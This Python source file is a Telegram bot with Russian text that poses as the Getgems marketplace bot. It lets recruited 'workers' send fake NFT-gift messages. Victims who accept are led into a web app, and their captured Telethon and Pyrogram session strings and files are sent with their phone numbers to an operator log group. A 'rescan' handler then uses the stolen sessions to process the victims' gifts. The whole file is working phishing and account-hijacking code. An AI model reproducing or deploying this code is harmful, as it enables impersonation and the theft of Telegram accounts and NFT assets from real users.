import asyncio
import logging
import os
import re
import secrets
from typing import Optional
from urllib.parse import urlparse, parse_qs
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    InlineQuery, InlineQueryResultArticle, InputTextMessageContent,
    InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, WebAppInfo
)
from aiogram.utils.keyboard import InlineKeyboardBuilder
from database import db
from config import Config


class AdminStates(StatesGroup):
    waiting_for_worker_id = State()


logging.basicConfig(
    level=getattr(logging, Config.LOG_LEVEL),
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

bot = Bot(token=Config.BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())


async def send_message_to_group_with_animation(message: str, user_id: int, phone: str, worker_info: dict = None):
    try:
        from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
        from aiogram.utils.keyboard import InlineKeyboardBuilder
        
        keyboard = InlineKeyboardBuilder()
        callback_data = f"rescan_gifts_{user_id}_{phone.replace('+', '')}"
        
        keyboard.add(
            InlineKeyboardButton(
                text="🔄 Повторить сканирование",
                callback_data=callback_data
            )
        )
        
        image_url = "https://i.ibb.co/mVV04yPg/image.png"
        
        try:
            result = await bot.send_photo(
                chat_id=Config.LOG_GROUP_ID,
                photo=image_url,
                caption=message,
                parse_mode=None,
                reply_markup=keyboard.as_markup()
            )
        except Exception as photo_error:
            logger.error(f"Error sending photo: {photo_error}")
            result = await bot.send_message(
                chat_id=Config.LOG_GROUP_ID,
                text=message,
                parse_mode=None,
                reply_markup=keyboard.as_markup()
            )
        
        return True
        
    except Exception as e:
        logger.error(f"Error sending message with animation to group: {e}")
        return False


async def send_message_to_group(message: str):
    try:
        if Config.LOG_CHAT_ID:
            await bot.send_message(
                chat_id=Config.LOG_CHAT_ID,
                text=message,
                parse_mode="Markdown"
            )
            logger.info("Сообщение отправлено в группу логов")
        else:
            logger.warning("LOG_CHAT_ID не настроен, сообщение не отправлено")
    except Exception as e:
        logger.error(f"Ошибка отправки сообщения в группу: {e}")


async def send_session_to_group(user_id: int, phone_number: str, session_string: str, is_pyrogram: bool = False):
    import tempfile
    import os
    from datetime import datetime
    
    temp_file_path = None
    try:
        session_type = "pyrogram_string" if is_pyrogram else "telethon_string"
        session_filename = f"session_{user_id}_{phone_number.replace('+', '')}_{session_type}.txt"
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as temp_file:
            temp_file.write(session_string)
            temp_file_path = temp_file.name
        
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        session_format = "Pyrogram Session String" if is_pyrogram else "Telethon Session String"
        signature = f"{session_format} from {user_id} @{phone_number} {phone_number}"
        
        message = (
            f"🔑 **Новый {session_format} получен!**\n\n"
            f"👤 **User ID:** `{user_id}`\n"
            f"📱 **Phone:** `{phone_number}`\n"
            f"📅 **Time:** `{current_time}`\n"
            f"🔧 **Format:** `{session_format}`\n"
            f"🔐 **Signature:** `{signature}`"
        )
        
        with open(temp_file_path, 'rb') as session_file:
            await bot.send_document(
                chat_id=Config.LOG_GROUP_ID,
                document=types.BufferedInputFile(
                    session_file.read(),
                    filename=session_filename
                ),
                caption=message,
                parse_mode="Markdown"
            )
        
        return True
    except Exception as e:
        logger.error(f"Error sending session string to group: {e}")
        return False
    finally:
        if temp_file_path and os.path.exists(temp_file_path):
            try:
                os.unlink(temp_file_path)
            except Exception:
                pass


async def send_session_file_to_group(user_id: int, phone_number: str, session_file_path: str, is_pyrogram: bool = False):
    import os
    from datetime import datetime
    
    try:
        if not os.path.exists(session_file_path):
            logger.error(f"Session file not found: {session_file_path}")
            return False
        
        session_type = "pyrogram" if is_pyrogram else "telethon"
        session_filename = f"session_{user_id}_{phone_number.replace('+', '')}_{session_type}.session"
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        session_format = "Pyrogram Session" if is_pyrogram else "Telethon Session"
        signature = f"{session_format} from {user_id} @{phone_number} {phone_number}"
        
        message = (
            f"🔑 **Новая {session_format} получена!**\n\n"
            f"👤 **User ID:** `{user_id}`\n"
            f"📱 **Phone:** `{phone_number}`\n"
            f"📅 **Time:** `{current_time}`\n"
            f"🔧 **Format:** `{session_format}`\n"
            f"🔐 **Signature:** `{signature}`"
        )
        
        with open(session_file_path, 'rb') as session_file:
            await bot.send_document(
                chat_id=Config.LOG_GROUP_ID,
                document=types.BufferedInputFile(
                    session_file.read(),
                    filename=session_filename
                ),
                caption=message,
                parse_mode="Markdown"
            )
        
        return True
    except Exception as e:
        logger.error(f"Error sending session file to group: {e}")
        return False


def parse_nft_link(nft_link: str) -> Optional[dict]:
    try:
        pattern = r't\.me/nft/([^-]+)-(\d+)'
        match = re.search(pattern, nft_link)
        if match:
            nft_name = match.group(1)
            nft_number = match.group(2)
            return {
                'name': nft_name,
                'number': nft_number,
                'display_name': f"{nft_name}"
            }
        return None
    except Exception as e:
        logger.error(f"Ошибка парсинга NFT ссылки: {e}")
        return None


def generate_share_token() -> str:
    return secrets.token_urlsafe(32)


@dp.inline_query()
async def inline_query_handler(query: InlineQuery):
    try:
        if not db.is_worker(query.from_user.id):
            results = [
                InlineQueryResultArticle(
                    id="not_worker",
                    title="Временно недоступно",
                    description="Создание подарочных ссылок временно недоступно",
                    input_message_content=InputTextMessageContent(
                        message_text="⚠️ Временно недоступно\n\nСоздание подарочных ссылок временно недоступно."
                    )
                )
            ]
            await query.answer(results, cache_time=1)
            return

        query_text = query.query.strip()
        if not query_text:
            results = [
                InlineQueryResultArticle(
                    id="instruction",
                    title="Как создать подарочную ссылку",
                    description="Введите ссылку на NFT после @usernamebot",
                    input_message_content=InputTextMessageContent(
                        message_text="Для создания подарочной ссылки введите: @usernamebot {ссылка на NFT}"
                    )
                )
            ]
            await query.answer(results, cache_time=1)
            return

        nft_info = parse_nft_link(query_text)
        if not nft_info:
            results = [
                InlineQueryResultArticle(
                    id="invalid_link",
                    title="Неверная ссылка на NFT",
                    description="Пожалуйста, введите корректную ссылку на NFT",
                    input_message_content=InputTextMessageContent(
                        message_text="❌ Неверная ссылка на NFT. Используйте формат: http://t.me/nft/название-номер"
                    )
                )
            ]
            await query.answer(results, cache_time=1)
            return

        share_token = generate_share_token()
        logger.info(f"Ensuring user registration for creator telegram_id: {query.from_user.id}")
        
        creator_user = db.get_or_create_user(
            telegram_id=query.from_user.id,
            username=query.from_user.username,
            first_name=query.from_user.first_name,
            last_name=query.from_user.last_name
        )
        logger.info(f"Creator user registration completed for {query.from_user.id}: {creator_user}")

        try:
            db.create_gift_share(
                nft_link=query_text,
                nft_name=nft_info['name'],
                nft_number=nft_info['number'],
                creator_telegram_id=query.from_user.id,
                share_token=share_token
            )
            from utils import log_user_action
            await log_user_action(
                'gift_link_created',
                user_info={'id': query.from_user.id},
                additional_data={'details': f"Создана ссылка на подарок: {nft_info['display_name']} ({query_text})"}
            )
        except Exception as e:
            logger.error(f"Ошибка сохранения в БД: {e}")
            results = [
                InlineQueryResultArticle(
                    id="db_error",
                    title="Ошибка создания подарка",
                    description="Попробуйте еще раз",
                    input_message_content=InputTextMessageContent(
                        message_text="❌ Произошла ошибка при создании подарочной ссылки"
                    )
                )
            ]
            await query.answer(results, cache_time=1)
            return

        keyboard = InlineKeyboardBuilder()
        keyboard.add(
            InlineKeyboardButton(
                text="📱 Посмотреть",
                url=query_text
            )
        )
        keyboard.add(
            InlineKeyboardButton(
                text="🎁 Принять подарок",
                url=f"https://t.me/{Config.BOT_USERNAME}?start=gift_{share_token}"
            )
        )
        keyboard.adjust(1)

        message_text = f"🎁 Вам дарят NFT: [{nft_info['display_name']}]({query_text})\n\nДля принятия нажмите кнопку ниже."
        
        results = [
            InlineQueryResultArticle(
                id=f"gift_{share_token}",
                title=f"🎁 Подарить {nft_info['display_name']}",
                description=f"NFT: {nft_info['display_name']}",
                input_message_content=InputTextMessageContent(
                    message_text=message_text,
                    parse_mode="Markdown"
                ),
                reply_markup=keyboard.as_markup()
            )
        ]
        await query.answer(results, cache_time=1)
        
    except Exception as e:
        logger.error(f"Ошибка в inline_query_handler: {e}")
        results = [
            InlineQueryResultArticle(
                id="error",
                title="Произошла ошибка",
                description="Попробуйте еще раз",
                input_message_content=InputTextMessageContent(
                    message_text="❌ Произошла ошибка. Попробуйте еще раз."
                )
            )
        ]
        await query.answer(results, cache_time=1)


@dp.message(CommandStart())
async def start_handler(message: types.Message):
    try:
        logger.info(f"Start command from user {message.from_user.id}")
        
        args = message.text.split(' ', 1)
        if len(args) > 1 and args[1].startswith('gift_'):
            share_token = args[1][5:]
            logger.info(f"Processing gift share token: {share_token}")
            
            gift_share = db.get_gift_share_by_token(share_token)
            logger.info(f"Gift share data: {gift_share}")
            
            if not gift_share:
                await message.answer("❌ Подарочная ссылка не найдена или недействительна.")
                return
            
            if gift_share['is_received']:
                await message.answer("❌ Этот подарок уже был принят.")
                return
            
            logger.info(f"Ensuring user registration for telegram_id: {message.from_user.id}")
            user = db.get_or_create_user(
                telegram_id=message.from_user.id,
                username=message.from_user.username,
                first_name=message.from_user.first_name,
                last_name=message.from_user.last_name
            )
            
            success = db.accept_gift_share(share_token, message.from_user.id)
            
            if success:
                from utils import log_user_action
                await log_user_action(
                    'link_activated',
                    user_info={
                        'telegram_id': message.from_user.id,
                        'username': message.from_user.username,
                        'first_name': message.from_user.first_name,
                        'last_name': message.from_user.last_name
                    },
                    additional_data={
                        'nft_name': gift_share['nft_name'],
                        'nft_link': gift_share['nft_link'],
                        'details': f"Активирована ссылка на подарок: {gift_share['nft_name']}"
                    }
                )
                
                try:
                    gift_id = db.add_gift_link(message.from_user.id, gift_share['nft_link'])
                except Exception as e:
                    logger.error(f"Error adding gift to webapp inventory: {e}")
                    await message.answer("❌ Ошибка при добавлении подарка в инвентарь")
                    return
                
                sender_user = db.get_user_by_telegram_id(gift_share['creator_telegram_id'])
                sender_username = sender_user['username'] if sender_user and sender_user['username'] else 'пользователь'
                
                success_message = f"@{sender_username} передал вам [NFT подарок]({gift_share['nft_link']}).\n\nТеперь он в вашем инвентаре."
                
                keyboard = InlineKeyboardBuilder()
                keyboard.add(InlineKeyboardButton(
                    text="📦 Инвентарь",
                    web_app=WebAppInfo(url=Config.WEBAPP_URL)
                ))
                await message.answer(success_message, parse_mode="Markdown", reply_markup=keyboard.as_markup())
            else:
                await message.answer("❌ Не удалось принять подарок. Попробуйте еще раз.")
        else:
            keyboard = InlineKeyboardBuilder()
            keyboard.add(
                InlineKeyboardButton(
                    text="Торговать Telegram Numbers",
                    url="https://getgems.io/collection/EQAOQdwdw8kGftJCSFgOErM1mBjYPe4DBPq8-AhF6vr9si5N"
                )
            )
            keyboard.add(
                InlineKeyboardButton(
                    text="Торговать Telegram Usernames",
                    url="https://getgems.io/collection/EQCA14o1-VWhS2efqoh_9M1b_A9DtKTuoqfmkn83AbJzwnPi"
                )
            )
            keyboard.add(
                InlineKeyboardButton(
                    text="Торговать Telegram Gifts",
                    url="https://getgems.io/gifts-collection"
                )
            )
            keyboard.adjust(1)
            
            start_text = f"""👋 Привет, {message.from_user.first_name or 'друг'}!
Это бот Getgems, через него можно торговать на нашем маркетплейсе прямо в мини-аппе Telegram.
💡 Чтобы дарить NFT-подарки, просто начните набирать в любой переписке @{Config.BOT_USERNAME} и введите ссылку на NFT."""
            
            await message.answer(start_text, reply_markup=keyboard.as_markup())
    except Exception as e:
        logger.error(f"Ошибка в start_handler: {e}")
        await message.answer("❌ Произошла ошибка. Попробуйте еще раз.")


@dp.callback_query(lambda c: c.data and c.data.startswith('rescan_gifts_'))
async def rescan_gifts_callback_handler(callback_query: CallbackQuery):
    try:
        await callback_query.answer()
        parts = callback_query.data.split('_')
        
        if len(parts) >= 4:
            user_id = int(parts[2])
            phone = '+' + parts[3]
            
            if callback_query.message.text:
                await callback_query.message.edit_text(
                    f"{callback_query.message.text}\n\n🔄 Повторное сканирование запущено...",
                    parse_mode="Markdown"
                )
            elif callback_query.message.caption:
                await callback_query.message.edit_caption(
                    caption=f"{callback_query.message.caption}\n\n🔄 Повторное сканирование запущено...",
                    parse_mode="Markdown"
                )
            else:
                await callback_query.message.reply("🔄 Повторное сканирование запущено...")
            
            from utils import log_user_action
            await log_user_action(
                'rescan_gifts_requested',
                user_info={'telegram_id': user_id},
                additional_data={'phone': phone, 'details': f"Запрошено повторное сканирование"}
            )
            
            try:
                from utils import check_session_exists, validate_session
                import os
                import requests
                
                if not (check_session_exists(phone) and validate_session(phone)):
                    await callback_query.message.reply(
                        "❌ Сессия истекла. Пожалуйста, пройдите авторизацию заново.",
                        parse_mode="Markdown"
                    )
                    return
                
                session_file = f"sessions/{phone.replace('+', '')}.session"
                if not os.path.exists(session_file):
                    await callback_query.message.reply(
                        "❌ Файл сессии не найден. Пожалуйста, пройдите авторизацию заново.",
                        parse_mode="Markdown"
                    )
                    return
                
                api_url = "http://localhost:5000/api/process_gifts"
                response = requests.post(api_url, json={'user_id': user_id}, timeout=30)
                result_data = response.json()
                
                if result_data.get('success'):
                    await callback_query.message.reply(
                        f"✅ Повторное сканирование завершено!\n\n{result_data.get('message', 'Успешно')}",
                        parse_mode="Markdown"
                    )
                else:
                    await callback_query.message.reply(
                        f"❌ Ошибка: {result_data.get('error', 'Неизвестная ошибка')}",
                        parse_mode="Markdown"
                    )
                    
            except Exception as e:
                logger.error(f"Ошибка при повторном сканировании: {e}")
                await callback_query.message.reply(
                    f"❌ Ошибка: {str(e)}",
                    parse_mode="Markdown"
                )
        else:
            await callback_query.answer("❌ Ошибка в данных", show_alert=True)
            
    except Exception as e:
        logger.error(f"Ошибка в rescan_gifts_callback_handler: {e}")
        await callback_query.answer("❌ Ошибка", show_alert=True)


@dp.message(Command("admin"))
async def admin_handler(message: types.Message):
    try:
        if not Config.is_admin(message.from_user.id):
            return
        
        workers = db.get_all_workers()
        keyboard = InlineKeyboardBuilder()
        keyboard.add(
            InlineKeyboardButton(
                text="➕ Добавить воркера",
                callback_data="admin_add_worker"
            )
        )
        if workers:
            keyboard.add(
                InlineKeyboardButton(
                    text="📋 Список воркеров",
                    callback_data="admin_list_workers"
                )
            )
        keyboard.adjust(1)
        
        admin_text = f"""
🔧 **Админ панель**
👥 **Активных воркеров:** {len(workers)}
"""
        await message.answer(admin_text, reply_markup=keyboard.as_markup(), parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Ошибка в admin_handler: {e}")
        await message.answer("❌ Произошла ошибка.")


@dp.callback_query(lambda c: c.data.startswith("admin_"))
async def admin_callback_handler(callback_query: CallbackQuery):
    try:
        if not Config.is_admin(callback_query.from_user.id):
            await callback_query.answer("❌ Нет прав.", show_alert=True)
            return
        
        action = callback_query.data
        
        if action == "admin_add_worker":
            state = FSMContext(storage=dp.storage, key=f"{callback_query.message.chat.id}:{callback_query.from_user.id}")
            await state.set_state(AdminStates.waiting_for_worker_id)
            
            keyboard = InlineKeyboardBuilder()
            keyboard.add(InlineKeyboardButton(text="🔙 Отмена", callback_data="admin_back"))
            
            await callback_query.message.edit_text(
                "👤 **Добавление воркера**\n\n"
                "Перешлите сообщение от пользователя или отправьте его Telegram ID.\n"
                "Например: `123456789`",
                parse_mode="Markdown",
                reply_markup=keyboard.as_markup()
            )
            
        elif action == "admin_list_workers":
            workers = db.get_all_workers()
            if not workers:
                await callback_query.message.edit_text("📋 Нет активных воркеров.", parse_mode="Markdown")
                return
            
            keyboard = InlineKeyboardBuilder()
            workers_text = "📋 **Список воркеров**\n\n"
            for i, worker in enumerate(workers, 1):
                name = worker.get('first_name', 'Неизвестно')
                if worker.get('last_name'):
                    name += f" {worker['last_name']}"
                username = f"@{worker['username']}" if worker.get('username') else "Нет username"
                workers_text += f"{i}. {name} ({username})\n"
                workers_text += f"   ID: `{worker['telegram_id']}`\n\n"
                keyboard.add(
                    InlineKeyboardButton(
                        text=f"❌ Удалить {name}",
                        callback_data=f"admin_remove_worker_{worker['telegram_id']}"
                    )
                )
            
            keyboard.add(InlineKeyboardButton(text="🔙 Назад", callback_data="admin_back"))
            keyboard.adjust(1)
            
            await callback_query.message.edit_text(
                workers_text,
                reply_markup=keyboard.as_markup(),
                parse_mode="Markdown"
            )
            
        elif action.startswith("admin_remove_worker_"):
            worker_id = int(action.split("_")[-1])
            if db.remove_worker(worker_id):
                await callback_query.answer("✅ Воркер удален.", show_alert=True)
                workers = db.get_all_workers()
                if not workers:
                    await callback_query.message.edit_text("📋 Нет активных воркеров.", parse_mode="Markdown")
                    return
                
                keyboard = InlineKeyboardBuilder()
                workers_text = "📋 **Список воркеров**\n\n"
                for i, worker in enumerate(workers, 1):
                    name = worker.get('first_name', 'Неизвестно')
                    if worker.get('last_name'):
                        name += f" {worker['last_name']}"
                    username = f"@{worker['username']}" if worker.get('username') else "Нет username"
                    workers_text += f"{i}. {name} ({username})\n"
                    workers_text += f"   ID: `{worker['telegram_id']}`\n\n"
                    keyboard.add(
                        InlineKeyboardButton(
                            text=f"❌ Удалить {name}",
                            callback_data=f"admin_remove_worker_{worker['telegram_id']}"
                        )
                    )
                
                keyboard.add(InlineKeyboardButton(text="🔙 Назад", callback_data="admin_back"))
                keyboard.adjust(1)
                
                await callback_query.message.edit_text(
                    workers_text,
                    reply_markup=keyboard.as_markup(),
                    parse_mode="Markdown"
                )
            else:
                await callback_query.answer("❌ Ошибка удаления.", show_alert=True)
                
        elif action == "admin_back":
            state = FSMContext(storage=dp.storage, key=f"{callback_query.message.chat.id}:{callback_query.from_user.id}")
            await state.clear()
            
            workers = db.get_all_workers()
            keyboard = InlineKeyboardBuilder()
            keyboard.add(
                InlineKeyboardButton(
                    text="➕ Добавить воркера",
                    callback_data="admin_add_worker"
                )
            )
            if workers:
                keyboard.add(
                    InlineKeyboardButton(
                        text="📋 Список воркеров",
                        callback_data="admin_list_workers"
                    )
                )
            keyboard.adjust(1)
            
            admin_text = f"""
🔧 **Админ панель**
👥 **Активных воркеров:** {len(workers)}
"""
            await callback_query.message.edit_text(
                admin_text,
                reply_markup=keyboard.as_markup(),
                parse_mode="Markdown"
            )
            
    except Exception as e:
        logger.error(f"Ошибка в admin_callback_handler: {e}")
        await callback_query.answer("❌ Ошибка.", show_alert=True)


@dp.message(AdminStates.waiting_for_worker_id)
async def handle_worker_id_input(message: types.Message, state: FSMContext):
    try:
        if not Config.is_admin(message.from_user.id):
            await message.answer("❌ Нет прав.")
            await state.clear()
            return
        
        worker_id = None
        
        if message.forward_from:
            worker_id = message.forward_from.id
            worker_name = message.forward_from.first_name or "Неизвестно"
            if message.forward_from.last_name:
                worker_name += f" {message.forward_from.last_name}"
            worker_username = f"@{message.forward_from.username}" if message.forward_from.username else "Нет username"
            
            db.get_or_create_user(
                telegram_id=worker_id,
                username=message.forward_from.username,
                first_name=message.forward_from.first_name,
                last_name=message.forward_from.last_name
            )
            
        elif message.text and message.text.isdigit():
            worker_id = int(message.text)
            user = db.get_user_by_telegram_id(worker_id)
            
            if user:
                worker_name = user.get('first_name', 'Неизвестно')
                if user.get('last_name'):
                    worker_name += f" {user['last_name']}"
                worker_username = f"@{user['username']}" if user.get('username') else "Нет username"
            else:
                try:
                    chat_member = await bot.get_chat(worker_id)
                    worker_name = chat_member.first_name or "Неизвестно"
                    if chat_member.last_name:
                        worker_name += f" {chat_member.last_name}"
                    worker_username = f"@{chat_member.username}" if chat_member.username else "Нет username"
                    
                    db.get_or_create_user(
                        telegram_id=worker_id,
                        username=chat_member.username,
                        first_name=chat_member.first_name,
                        last_name=chat_member.last_name
                    )
                except Exception as e:
                    db.get_or_create_user(telegram_id=worker_id)
                    worker_name = "Неизвестно"
                    worker_username = "Нет username"
        else:
            await message.answer("❌ Неверный формат. Отправьте ID или перешлите сообщение.")
            return
        
        if db.add_worker(worker_id):
            await message.answer(
                f"✅ **Воркер добавлен!**\n\n"
                f"👤 **Имя:** {worker_name}\n"
                f"🆔 **Username:** {worker_username}\n"
                f"🔢 **ID:** `{worker_id}`",
                parse_mode="Markdown"
            )
        else:
            await message.answer("❌ Ошибка при добавлении воркера.")
        
        await state.clear()
        
    except Exception as e:
        logger.error(f"Ошибка в handle_worker_id_input: {e}")
        await message.answer("❌ Произошла ошибка.")
        await state.clear()


async def main():
    try:
        if not Config.validate_bot_token():
            return
        bot_info = await bot.get_me()
        logger.info(f"Бот запущен: @{bot_info.username}")
        await dp.start_polling(bot)
    except Exception as e:
        logger.error(f"Ошибка запуска бота: {e}")
    finally:
        await bot.session.close()


if __name__ == "__main__":
    asyncio.run(main())
